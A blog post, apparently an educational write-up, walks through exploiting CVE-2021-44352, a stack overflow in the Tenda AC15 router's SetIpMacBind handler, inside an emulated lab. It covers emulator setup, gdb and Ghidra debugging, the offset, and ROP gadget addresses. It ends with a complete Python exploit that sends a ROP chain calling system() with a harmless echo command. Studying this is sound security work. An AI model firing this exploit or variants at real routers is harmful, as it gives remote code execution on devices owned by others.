---
layout: post
title:  "[Router Exploit] Exploit Tenda ac15 - CVE-2021-44352"
date:   2025-01-03
categories: router
description: Exploit stack overflow on Tenda AC15 (AC15 V15.03.05.18_multi device)
tags: binary reverseengineering router tendac15
---

# Background

In this article we are going to deep dive into Tenda AC15 Firmware (AC15 V15.03.05.18_multi device), it's been a while since my previous post and it's a 2 day research project so it's going to be an easy reading article folks!, yesterday I just scrolling around the internet, feeling super bored since everyone is celebrating new year then I found a repository called `emux`, I always curious with reverse engineering router and `emux` seems like a super handy tools. It's a tools for emulating firmware (https://github.com/therealsaumil/emux). After banging my head against the wall for a day (setting up the environment), I found that `emux` is amazing, make it easier to setup environment, debugging and exploit development. It always be a good start to use a known CVE to learn about exploit development. This article will work based on `CVE-2021-44352`, I will cover on how I setup the environment, debugging and crafting the exploit script.

# Setup

You can clone the source code from the official repository

    git clone https://github.com/therealsaumil/emux

Make sure you have installed docker on your machine.

setup the docker volume for emux by running below command

    ./build-emux-volume

Build the emux docker by running command:

    ./build-emux-docker

once everything running, you can execute below command to run the emux environment

    ./run-emux-docker

then you can access emux by execute below command

    ./emux-docker-shell

now we can launch the firmware by executing command 

    $ launcher


Then select Tenda AC15 Wifi Router


<img src="/images/tendac15/launcher.png" />

Now you can access the tenda admin portal by accessing 

    http://127.0.0.1:20080/login.html

You can login to the portal using password `ringzer0` thanks to emux for setting up everything for us.

# Debugging

I assume you have setting up everything, and able to reach the tenda admin portal.

<img src="/images/tendac15/portal.png" />

Now we can find the `httpd` PID by running `emuxps` thanks to `emux`

    $ emuxps | grep httpd

Remember to run above command on `emux-docker` environment.

Now you can attach the `httpd` PID to gdb by using `emuxgdb` once again, thanks to `emux` ;)

    $ emuxgdb 15457

Now we should be able to debug the `httpd`

# Dynamic Analysis

After reading the CVE-2021-44352 (https://nvd.nist.gov/vuln/detail/CVE-2021-44352), we can see that the vulnerability is on `/goform/SetIpMacBind`, from this information we can only focus on this PATH, and the vulnerability parameter is on `list` since we don't know what is the other parameter on this PATH so we should find the correct parameter.

<img src="/images/tendac15/cve-detail.png">


I use `grep` to find `SetIpMacBind` string inside webroot folder, and found there's a source code inside `./js/ip_mac_bind.js` mentioned `SetIpMacBind` PATH


<img src="/images/tendac15/webroot.png">


I found the required parameter based on file `./js/ip_mac_bind.js`, it's required `bindnum` and `list`

<img src="/images/tendac15/source-code.png" />

then check the `httpd` binary using ghidra, there is a function called `fromSetIpMacBind` which processing our input parameter `bindnum` and `list`, and there's a `strcpy` there.

<img src="/images/tendac15/ghidra.png" />

Since we are able to identify the function handler inside the `httpd` binary now it's time for debugging. I use the same method as I explain on the Debugging Section, and I use `pattern create` to find the right offset. After setup the break point address at `0x8b2f8` we got segfault. 

<img src="/images/tendac15/gdb.png" />

Now I am able to overwrite the `%pc` register and found the offset `428`.

# Exploitation

Last piece, we need to collect all gadget required to triggering RCE and do ROP Chain, due to lack of PIE or ASLR, we can use a static address offset of libc to calculate the required gadget, you can use tools like objdump to find gadgets.

    base_libc = 0x40202000
    system_offset = 0x0005a270
    libc_system = base_libc + system_offset
    gadget1 = base_libc + 0x00018298 #  pop     {r3, pc}
    gadget2 = base_libc + 0x00040cb8 #  mov     r0, sp

Let's finalize the exploit script.

{% highlight python %}
#!/usr/bin/python3
from lib.http import HTTP
from pwn import *

# ip = "172.20.10.4"
ip = "localhost"
port = "20080"
# Break point 
# 0x8afb0 (main)
# 0x8b2f8 (strcpy)

def POC():
    # initialize connection
    http_driver = HTTP(ip, port)
    http_driver.login_tenda("admin", "ringzer0")
    print("test network:", http_driver.test_network())

    # making buffers
    # p = b"aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaae"
    cmd = b'echo "tripoloski here :P, executing uname: `uname -a`"'
    base_libc = 0x40202000
    system_offset = 0x0005a270
    libc_system = base_libc + system_offset
    gadget1 = base_libc + 0x00018298 #  pop     {r3, pc}
    gadget2 = base_libc + 0x00040cb8 #  mov     r0, sp

    print('gadget1:',hex(gadget1))
    print('gadget2:',hex(gadget2))

    p = b'A' * (428) + p32(gadget1) + p32(libc_system) + p32(gadget2) + cmd

    data = {
        "bindnum": 1,
        "list": p
    }
    SetIpMacBind = http_driver.make_post("/goform/SetIpMacBind", data)
    print("response from vulnerable endpoint: ", SetIpMacBind.text)
    

if __name__ == "__main__":
    POC()

# print(x)

{% endhighlight %}



Run the exploit and we got the shell

<img src="/images/tendac15/RCE.png" />